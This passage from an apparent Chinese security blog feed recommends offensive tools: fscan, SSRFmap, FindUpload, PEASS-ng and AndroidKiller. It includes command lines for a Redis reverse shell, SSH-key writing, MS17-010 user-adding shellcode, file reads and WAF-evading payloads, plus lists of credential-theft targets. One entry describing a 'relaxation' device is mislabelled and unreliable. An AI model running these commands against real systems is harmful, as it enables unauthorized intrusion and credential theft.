(as: -rf id_rsa.pub)</span><br><span class="line">-rs string</span><br><span class="line">      redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)</span><br><span class="line">-silent</span><br><span class="line">      静默扫描,适合cs扫描时不回显</span><br><span class="line">-sshkey string</span><br><span class="line">      ssh连接时,指定ssh私钥</span><br><span class="line">-t int</span><br><span class="line">      扫描线程 (default 600)</span><br><span class="line">-time int</span><br><span class="line">      端口扫描超时时间 (default 3)</span><br><span class="line">-u string</span><br><span class="line">      指定Url扫描</span><br><span class="line">-uf string</span><br><span class="line">      指定Url文件扫描</span><br><span class="line">-wt int</span><br><span class="line">      web访问超时时间 (default 5)</span><br><span class="line">-pocpath string</span><br><span class="line">      指定poc路径</span><br><span class="line">-usera string</span><br><span class="line">      在原有用户字典基础上,新增新用户</span><br><span class="line">-pwda string</span><br><span class="line">      在原有密码字典基础上,增加新密码</span><br><span class="line">-socks5</span><br><span class="line">      指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)</span><br><span class="line">-sc </span><br><span class="line">      指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)</span><br></pre></td></tr></tbody></table></figure><h2 id="4-运行截图"><a href="#4-运行截图" class="headerlink" title="4.运行截图"></a>4.运行截图</h2><p><code>fscan.exe -h 192.168.x.x  (全功能、ms17010、读取网卡信息)</code> <a href="https://github.com/shadow1ng/fscan/blob/main/image/1.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/1.png" alt="img"></a></p><p><a href="https://github.com/shadow1ng/fscan/blob/main/image/4.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/4.png" alt="img"></a></p><p><code>fscan.exe -h 192.168.x.x -rf id_rsa.pub (redis 写公钥)</code> <a href="https://github.com/shadow1ng/fscan/blob/main/image/2.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/2.png" alt="img"></a></p><p><code>fscan.exe -h 192.168.x.x -c "whoami;id" (ssh 命令)</code> <a href="https://github.com/shadow1ng/fscan/blob/main/image/3.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/3.png" alt="img"></a></p><p><code>fscan.exe -h 192.168.x.x -p80 -proxy http://127.0.0.1:8080 一键支持xray的poc</code> <a href="https://github.com/shadow1ng/fscan/blob/main/image/2020-12-12-13-34-44.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/2020-12-12-13-34-44.png" alt="img"></a></p><p><code>fscan.exe -h 192.168.x.x -p 139 (netbios探测、域控识别,下图的[+]DC代表域控)</code> <a href="https://github.com/shadow1ng/fscan/blob/main/image/netbios.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/netbios.png" alt="img"></a></p><p><code>go run .\main.go -h 192.168.x.x/24 -m netbios(-m netbios时,才会显示完整的netbios信息)</code> <a href="https://github.com/shadow1ng/fscan/blob/main/image/netbios1.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/netbios1.png" alt="img"></a></p><p><code>go run .\main.go -h 192.0.0.0/8 -m icmp(探测每个C段的网关和数个随机IP,并统计top 10 B、C段存活数量)</code> <a href="https://github.com/shadow1ng/fscan/blob/main/image/live.png"><img src="https://github.com/shadow1ng/fscan/raw/main/image/live.png" alt="img.png"></a></p><h2 id="5-免责声明"><a href="#5-免责声明" class="headerlink" title="5.免责声明"></a>5.免责声明</h2><p>本工具仅面向<strong>合法授权</strong>的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。</p><p>为避免被恶意使用，本项目所有收录的poc均为漏洞的理论判断，不存在漏洞利用过程，不会对目标发起真实攻击和漏洞利用。</p><p>在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。<strong>请勿对非授权目标进行扫描。</strong></p><p>如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。</p><p>在安装并使用本工具前，请您<strong>务必审慎阅读、充分理解各条款内容</strong>，限制、免责条款或者其他涉及您重大权益的条款可能会以加粗、加下划线等形式提示您重点注意。 除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞自动扫描与利用工具</title>
      <link href="/2024/03/19/27-SSRF%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/03/19/27-SSRF%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E4%B8%8E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>SSRF 通常用于利用其他服务上的操作，该框架旨在轻松查找和利用这些服务。SSRFmap 将 Burp 请求文件作为输入和模糊测试的参数。</p><h2 id="Github链接"><a href="#Github链接" class="headerlink" title="Github链接:"></a>Github链接:</h2><p><a href="https://github.com/swisskyrepo/SSRFmap">https://github.com/swisskyrepo/SSRFmap</a></p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>以下模块已实现并且可以与<code>-m</code>参数一起使用。</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td><code>fastcgi</code></td><td>FastCGI 远程代码执行</td></tr><tr><td><code>redis</code></td><td>Redis 远程代码执行</td></tr><tr><td><code>github</code></td><td>Github 企业 RCE &lt; 2.8.7</td></tr><tr><td><code>zabbix</code></td><td>Zabbix 远程代码执行</td></tr><tr><td><code>mysql</code></td><td>MySQL命令执行</td></tr><tr><td><code>postgres</code></td><td>Postgres 命令执行</td></tr><tr><td><code>docker</code></td><td>通过 API 泄露 Docker 信息</td></tr><tr><td><code>smtp</code></td><td>SMTP发送邮件</td></tr><tr><td><code>portscan</code></td><td>扫描主机的前 8000 个端口</td></tr><tr><td><code>networkscan</code></td><td>HTTP Ping 扫描网络</td></tr><tr><td><code>readfiles</code></td><td>读取文件，例如<code>/etc/passwd</code></td></tr><tr><td><code>alibaba</code></td><td>从提供者读取文件（例如：元数据、用户数据）</td></tr><tr><td><code>aws</code></td><td>从提供者读取文件（例如：元数据、用户数据）</td></tr><tr><td><code>gce</code></td><td>从提供者读取文件（例如：元数据、用户数据）</td></tr><tr><td><code>digitalocean</code></td><td>从提供者读取文件（例如：元数据、用户数据）</td></tr><tr><td><code>socksproxy</code></td><td>SOCKS4代理</td></tr><tr><td><code>smbhash</code></td><td>通过 UNC 路径强制 SMB 身份验证</td></tr><tr><td><code>tomcat</code></td><td>针对 Tomcat Manager 的暴力攻击</td></tr><tr><td><code>custom</code></td><td>将自定义数据发送到监听服务，例如：netcat</td></tr><tr><td><code>memcache</code></td><td>将数据存储在 memcache 实例中</td></tr></tbody></table><h2 id="安装和手册"><a href="#安装和手册" class="headerlink" title="安装和手册"></a>安装和手册</h2><p>从 Github 存储库进行基本安装。</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">clone</span> https://github.com/swisskyrepo/SSRFmap.git</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> SSRFmap/</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pip3 install -r requirements.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">python3 ssrfmap.py</span></span><br><span class="line"></span><br><span class="line">  usage: ssrfmap.py [-h] [-r REQFILE] [-p PARAM] [-m MODULES] [-l HANDLER]</span><br><span class="line">                    [-v [VERBOSE]] [--lhost LHOST] [--lport LPORT]</span><br><span class="line">                    [--uagent USERAGENT] [--ssl [SSL]] [--level [LEVEL]]</span><br><span class="line"></span><br><span class="line">  optional arguments:</span><br><span class="line">    -h, --help          show this help message and exit</span><br><span class="line">    -r REQFILE          SSRF Request file</span><br><span class="line">    -p PARAM            SSRF Parameter to target</span><br><span class="line">    -m MODULES          SSRF Modules to enable</span><br><span class="line">    -l HANDLER          Start an handler for a reverse shell</span><br><span class="line">    -v [VERBOSE]        Enable verbosity</span><br><span class="line">    --lhost LHOST       LHOST reverse shell</span><br><span class="line">    --lport LPORT       LPORT reverse shell</span><br><span class="line">    --uagent USERAGENT  User Agent to use</span><br><span class="line">    --ssl [SSL]         Use HTTPS without verification</span><br><span class="line">    --proxy PROXY       Use HTTP(s) proxy (ex: http://localhost:8080)</span><br><span class="line">    --level [LEVEL]     Level of test to perform (1-5, default: 1)</span><br></pre></td></tr></tbody></table></figure><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>首先，您需要一个带有参数的请求来进行模糊测试，Burp 请求与 SSRFmap 配合良好。它们应该如下所示。**/data**文件夹中提供了更多示例。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:5000</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://mysimple.ssrf/</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">url=https%3A%2F%2Fwww.google.fr</span><br></pre></td></tr></tbody></table></figure><p>使用<code>-m</code>后跟模块名称（<code>,</code>如果要启动多个模块，则用 ‘,’ 分隔）。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Launch a portscan on localhost and read default files</span><br><span class="line">python ssrfmap.py -r data/request.txt -p url -m readfiles,portscan</span><br></pre></td></tr></tbody></table></figure><p>如果您需要自定义用户代理，请使用<code>--uagent</code>. 某些目标将使用 HTTPS，您可以使用 启用它<code>--ssl</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Launch a portscan against an HTTPS endpoint using a custom user-agent</span><br><span class="line">python ssrfmap.py -r data/request.txt -p url -m portscan --ssl --uagent "SSRFmapAgent"</span><br></pre></td></tr></tbody></table></figure><p>有些模块允许您创建回连，您必须指定 LHOST 和 LPORT。SSRFmap 还可以侦听传入的反向 shell。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Triggering a reverse shell on a Redis</span><br><span class="line">python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=4242 -l 4242</span><br><span class="line"></span><br><span class="line"># -l create a listener for reverse shell on the specified port</span><br><span class="line"># --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload</span><br></pre></td></tr></tbody></table></figure><p>当目标受 WAF 或某些过滤器保护时，您可以尝试使用参数的各种有效负载和编码<code>--level</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># --level : ability to tweak payloads in order to bypass some IDS/WAF. e.g: 127.0.0.1 -&gt; [::] -&gt; 0000: -&gt; ...</span><br></pre></td></tr></tbody></table></figure><h2 id="SSRFmap-测试"><a href="#SSRFmap-测试" class="headerlink" title="SSRFmap 测试"></a>SSRFmap 测试</h2><p>可以使用 SSRF 服务来快速测试框架<code>data/example.py</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FLASK_APP=data/example.py flask run &amp;</span><br><span class="line">python ssrfmap.py -r data/request.txt -p url -m readfiles</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透神器-(8+1)+1por</title>
      <link href="/2024/03/17/41-%E6%B8%97%E9%80%8F%E9%A1%B6%E5%B0%96%E7%A5%9E%E5%99%A8/"/>
      <url>/2024/03/17/41-%E6%B8%97%E9%80%8F%E9%A1%B6%E5%B0%96%E7%A5%9E%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-8-1-1por-渗透神器简介"><a href="#1-8-1-1por-渗透神器简介" class="headerlink" title="1:(8+1)+1por-渗透神器简介"></a>1:(8+1)+1por-渗透神器简介</h1><h2 id="1-支持功能"><a href="#1-支持功能" class="headerlink" title="1-支持功能"></a>1-支持功能</h2><ol><li><strong>全面覆盖各类放松场景</strong>：该工具内置丰富的放松模块，包括但不限于工作间隙小憩、睡前助眠、晨间唤醒、深度压力释放、专注力提升等多种场景模式。</li><li><strong>智能生物传感技术</strong>：配备先进的生物传感器，能实时监测心率变异性、皮肤电导等生理指标，动态调整放松方案，实现精准放松。</li><li><strong>虚拟现实沉浸式体验</strong>：通过VR技术打造身临其境的环境，让用户仿佛置身于大自然、瑜伽室、温泉疗养地等有助于放松的场景之中。</li><li><strong>专业心理指导课程</strong>：提供由老师录制的音频\视频课程，涵盖正念练习、认知行为疗法、自我催眠等多种心理健康领域的方法论。</li><li><strong>个性化数据分析报告</strong>：生成详细的个人放松数据报告，帮助用户了解自身的放松习惯和效果，以便逐步优化放松计划。</li><li><strong>人性化操作界面</strong>：设计简洁易用的操作界面，即使是对科技产品不太熟悉的用户也能快速上手，享受轻松愉悦的用户体验。</li><li><strong>云端同步与跨平台支持</strong>：用户数据云端备份，不论是在手机、平板还是电脑上都能无缝切换，随时随地享受专属的放松时光。</li><li><strong>多元化内容库</strong>：包含大量原创及授权的高质量放松素材，如白噪音、ASMR、舒缓音乐、冥想故事等，满足用户的多样化需求。</li><li><strong>健康管理集成</strong>：可与运动手环、智能手表等其他健康设备联动，从睡眠质量到日常活动量，全方位助力用户身心健康。</li><li><strong>社交共享与挑战活动</strong>：鼓励用户参与在线挑战，邀请好友共同完成放松目标，同时支持分享心得感悟，共建积极健康的线上社区文化。</li></ol><h2 id="2-提供多种web-移动端的渗透目标"><a href="#2-提供多种web-移动端的渗透目标" class="headerlink" title="2-提供多种web/移动端的渗透目标"></a>2-提供多种web/移动端的渗透目标</h2><ol><li><strong>Web应用程序登录系统</strong>：<ul><li>目标：测试网站登录模块是否存在漏洞，如弱口令、暴力破解、验证码绕过、身份验证失效等。</li><li>渗透策略：实施账户枚举、密码猜测、令牌劫持等方式尝试登录，探索会话管理机制的漏洞以获取未授权访问权限。</li></ul></li><li><strong>API接口安全</strong>：<ul><li>目标：评估Web API接口的安全性，包括参数篡改、资源越权访问、敏感信息泄露等风险。</li><li>渗透策略：利用自动化工具或手动发送伪造请求，测试API对于异常参数处理的健壮性，尝试触发逻辑漏洞。</li></ul></li><li><strong>前端XSS跨站脚本攻击</strong>：<ul><li>目标：查找并验证Web页面是否存在跨站脚本攻击漏洞，可能导致用户浏览器被恶意脚本攻击。</li><li>渗透策略：构造并注入恶意脚本，观察是否能在用户浏览器中执行，测试过滤器的有效性及DOM型XSS漏洞。</li></ul></li><li><strong>移动端反编译与二次打包</strong>：<ul><li>目标：检查移动应用的安全防护能力，防止恶意用户通过反编译、篡改代码后重新打包发布。</li><li>渗透策略：尝试对apk/ipa文件进行逆向工程，查看源码中是否有敏感信息暴露，修改关键逻辑后再进行重打包和安装测试。</li></ul></li><li><strong>移动支付安全</strong>：<ul><li>目标：检测移动应用内支付功能的安全性，防范中间人攻击、恶意扣费、交易数据篡改等风险。</li><li>渗透策略：监控并拦截支付过程中的网络通信数据，试图篡改交易金额或窃取支付凭据，同时测试服务器端对支付请求的校验机制。</li></ul></li></ol><p>所以此神器还能够在使用者放松的时候,有意或者无意间,取得更先进的技术,可谓是学习放松两不当误</p><h2 id="3-实机演示"><a href="#3-实机演示" class="headerlink" title="3-实机演示"></a>3-实机演示</h2>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FindUpload-寻找上传点-登陆点</title>
      <link href="/2024/03/17/14-FindUpload-%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E7%99%BB%E9%99%86%E7%82%B9-%E4%B8%8A%E4%BC%A0%E7%82%B9/"/>
      <url>/2024/03/17/14-FindUpload-%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E7%99%BB%E9%99%86%E7%82%B9-%E4%B8%8A%E4%BC%A0%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="🚀-FindUpload-💥"><a href="#🚀-FindUpload-💥" class="headerlink" title="🚀 FindUpload 💥"></a>🚀 FindUpload 💥</h1><p>帮助你快速发现文件上传点,遇强则强,知攻善防</p><h2 id="⚙️-功能"><a href="#⚙️-功能" class="headerlink" title="⚙️ 功能"></a>⚙️ 功能</h2><ul><li>通过批量的 URL 进行目标搜索</li><li>支持使用代理进行扫描</li><li>可以配置线程数以提高效率</li></ul><h2 id="📝-使用方法"><a href="#📝-使用方法" class="headerlink" title="📝 使用方法"></a>📝 使用方法</h2><ol><li>在 <code>urls.txt</code> 文件中添加目标 URL。每行一个 URL，可以按需添加需要扫描的目标。(完整的url,需包含http/https)</li><li>在 <code>config.ini</code> 文件中配置代理和线程数。根据需要设置代理和适当的线程数以达到最佳效果。</li><li>在命令行中执行以下命令来启动工具：</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python f.py -u # 扫描上传点</span><br><span class="line">python f.py -l # 扫描登录点</span><br></pre></td></tr></tbody></table></figure><ol><li>工具将自动进行扫描，当发现文件上传点时，将会输出结果到upload.txt文件中</li><li>当发现登录点时，将会输出结果到login.txt文件中</li></ol><h2 id="⚠️-注意事项"><a href="#⚠️-注意事项" class="headerlink" title="⚠️ 注意事项"></a>⚠️ 注意事项</h2><ul><li>⚠️ 请确保你具有合法授权来测试和使用此工具。</li><li>⚠️ 在使用该工具期间，请遵守当地相关法律法规。</li><li>⚠️ 开发者对工具使用所产生的任何不当行为概不负责。</li></ul><h2 id="github链接"><a href="#github链接" class="headerlink" title="github链接:"></a>github链接:</h2><p><a href="https://github.com/dahezhiquan/FindUpload/">https://github.com/dahezhiquan/FindUpload/</a></p><h2 id="下载和使用"><a href="#下载和使用" class="headerlink" title="下载和使用"></a>下载和使用</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#下载该工具</span><br><span class="line">git clone https://github.com/dahezhiquan/FindUpload.git</span><br><span class="line">#使用命令</span><br><span class="line">python f.py -u # 扫描上传点</span><br><span class="line">python f.py -l # 扫描登录点</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全自动提权工具-Windows-Linux-Macos</title>
      <link href="/2024/03/16/22-LinuxWindowsMACOS%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/03/16/22-LinuxWindowsMACOS%E8%87%AA%E5%8A%A8%E6%8F%90%E6%9D%83%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="PEASS-ng-全自动提权工具"><a href="#PEASS-ng-全自动提权工具" class="headerlink" title="PEASS-ng-全自动提权工具"></a>PEASS-ng-全自动提权工具</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1-简介"></a>1-简介</h2><p><img src="https://pic.imgdb.cn/item/65f565eb9f345e8d03b55cf4.png" alt="img"></p><p>一款支持Linux-Windows-MacOS的自动提权工具.直接运行即可.</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">按下Win+R，运行netplwiz，查看您的账户</span><br></pre></td></tr></tbody></table></figure><h2 id="2-github链接"><a href="#2-github链接" class="headerlink" title="2-github链接"></a>2-github链接</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng</span><br></pre></td></tr></tbody></table></figure><h2 id="3-github下载链接"><a href="#3-github下载链接" class="headerlink" title="3-github下载链接"></a>3-github下载链接</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/carlospolop/PEASS-ng/releases/tag/20240310-532aceca</span><br></pre></td></tr></tbody></table></figure><h2 id="4-使用方式"><a href="#4-使用方式" class="headerlink" title="4-使用方式"></a>4-使用方式</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#Windows下</span><br><span class="line">最好使用pwershell运行即可</span><br><span class="line">#Linux下</span><br><span class="line">直接运行</span><br><span class="line">#MacOS下,自行测试</span><br></pre></td></tr></tbody></table></figure><h2 id="5-扫描哪些信息"><a href="#5-扫描哪些信息" class="headerlink" title="5-扫描哪些信息"></a>5-扫描哪些信息</h2><h4 id="能检查哪些信息"><a href="#能检查哪些信息" class="headerlink" title="能检查哪些信息:"></a>能检查哪些信息:</h4><ul><li>系统信息<ul><li>基本系统信息</li><li>使用 Watson 搜索漏洞</li><li>枚举 Microsoft 更新信息</li><li>PS、审计、WEF 和 LAPS 设置</li><li>LSA 保护</li><li>凭据保护</li><li>WDigest</li><li>缓存的信用数量</li><li>环境变量</li><li>互联网设置</li><li>当前驱动器信息</li><li>杀毒软件</li><li>Windows Defender</li><li>UAC 配置</li><li>NTLM 设置</li><li>本地组策略</li><li>Applocker 配置和绕过建议</li><li>打印机</li><li>命名管道</li><li>AMSI 供应商</li><li>系统监视器</li><li>.NET 版本</li></ul></li><li>用户信息<ul><li>用户信息</li><li>当前令牌特权</li><li>剪贴板文本</li><li>当前登录的用户</li><li>RDP 会话</li><li>曾经登录过的用户</li><li>自动登录凭据</li><li>主文件夹</li><li>密码策略</li><li>本地用户详细信息</li><li>登录会话</li></ul></li><li>进程信息<ul><li>有趣的进程（非微软）</li></ul></li><li>服务信息<ul><li>有趣的服务（非 Microsoft）信息</li><li>可修改的服务</li><li>可写服务注册表binpath</li><li>PATH DLL劫持</li></ul></li><li>应用信息<ul><li>当前活动窗口</li><li>安装的软件</li><li>自动运行</li><li>计划任务</li><li>设备驱动程序</li></ul></li><li>网络信息<ul><li>当前net share</li><li>映射驱动器 (WMI)</li><li>主机文件</li><li>网络接口</li><li>监听端口</li><li>防火墙规则</li><li>DNS 缓存（限制 70）</li><li>互联网设置</li></ul></li><li>Windows 凭据<ul><li>Windows 保险库</li><li>凭证管理器</li><li>保存的 RDP 设置</li><li>最近运行的命令</li><li>默认 PS 成绩单文件</li><li>DPAPI 万能密钥</li><li>DPAPI 凭据文件</li><li>远程桌面连接管理器凭据</li><li>Kerberos 门票</li><li>无线上网</li><li>AppCmd.exe</li><li>SSClient.exe</li><li>SCCM</li><li>安全包凭证</li><li>AlwaysInstallElevated</li><li>WSUS</li></ul></li><li>浏览器信息<ul><li>Firefox 数据库</li><li>Firefox 历史上的凭据</li><li>Chrome 数据库</li><li>chrome 历史上的凭据</li><li>当前的 IE 选项卡</li><li>IE历史上的凭据</li><li>IE 收藏夹</li><li><strong>提取已保存的密码：Firefox、Chrome、Opera、Brave</strong></li></ul></li><li>有趣的文件和注册表<ul><li>Putty会话</li><li>Putty SSH 主机密钥</li><li>SuperPutty信息</li><li>OneDrive 同步的 Office365 端点</li><li>注册表中的 SSH 密钥</li><li>云凭证</li><li>检查无人参与的文件</li><li>检查 SAM 和 SYSTEM 备份</li><li>检查缓存的 GPP 密码</li><li>从 McAffe SiteList.xml 文件中检查并提取凭据</li><li>可能的具有凭据的注册表</li><li>用户家中可能的凭据文件</li><li><strong>回收站中可能存在的密码文件</strong></li><li>可能包含凭据的文件（这需要几分钟）</li><li>用户文件（限制 100 个）</li><li>Oracle SQL Developer 配置文件检查</li><li>Slack文件搜索</li><li>Outlook 下载</li><li>机器和用户证书文件</li><li>Office最近的文件</li><li>隐藏的文件和文件夹</li><li>具有写入权限的非默认文件夹中的可执行文件</li><li>WSL 检查</li></ul></li><li>活动信息<ul><li>登录 + 显式登录事件</li><li>流程创建事件</li><li>PowerShell 事件</li><li>电源开/关事件</li></ul></li><li>附加（较慢）检查<ul><li>LOLBAS 搜索</li><li>在默认 WSL 分发中运行**<a href="https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh">linpeas.sh</a>**</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APK自动反编译工具-androidkiller</title>
      <link href="/2024/03/15/9-APK%E8%87%AA%E5%8A%A8%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/03/15/9-APK%E8%87%AA%E5%8A%A8%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">带插件的androidkiller的github链接:</span></span><br><span class="line">https://github.com/liaojack8/AndroidKiller #androidkiller</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Apktool|ShakaApktool 简体中文汉化版|APK反编译工具</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ShakaApktool源码：<span class="comment">#https://github.com/rover12421/ShakaApktool 作者：rover12421</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">apktool源码：https://github.com/iBotPeaches/Apktool  作者：iBotPeaches</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">smali/baksmali源码：https://github.com/JesusFreke/smali 作者：JesusFreke</span></span><br></pre></td></tr></tbody></table></figure><h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1-简介"></a>1-简介</h1><h2 id="功能简介-工具"><a href="#功能简介-工具" class="headerlink" title="功能简介-工具"></a>功能简介-工具</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#文本-编码相互转换</span><br><span class="line">#支持UTF-8,Unicode,ANSI</span><br></pre></td></tr></tbody></table></figure><h3 id="MD5查看器-支持文件和字符串"><a href="#MD5查看器-支持文件和字符串" class="headerlink" title="MD5查看器-支持文件和字符串"></a>MD5查看器-支持文件和字符串</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#MD5查看器</span><br><span class="line">MD5-16: </span><br><span class="line">743267D4B546565A</span><br><span class="line"></span><br><span class="line">MD5-32: </span><br><span class="line">B268D6A7743267D4B546565ABA342DC1</span><br><span class="line"></span><br><span class="line">CRC-16: </span><br><span class="line">3A3C</span><br><span class="line"></span><br><span class="line">CRC-32: 